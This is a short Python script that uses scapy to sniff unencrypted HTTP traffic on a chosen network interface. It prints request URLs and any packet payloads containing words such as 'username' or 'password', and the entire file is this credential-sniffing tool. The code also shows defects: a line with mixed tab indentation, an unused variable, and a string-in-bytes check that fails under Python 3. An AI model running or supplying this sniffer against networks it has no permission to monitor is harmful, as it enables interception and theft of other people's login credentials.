import argparse
import scapy.all as scapy
from scapy.layers import http

def get_options():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",default="eth0",help="Interface of the Network")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn = process_sniffed_data)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username","user","email","login","password","pass","pwd"]
        flag = False
        for keyword in keywords:
            if keyword in load:
                    return load

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniffed_data(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
#        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)

	if login_info:
            print("[+] Possible username and password >> " + login_info)

options = get_options()

sniff(options.interface)
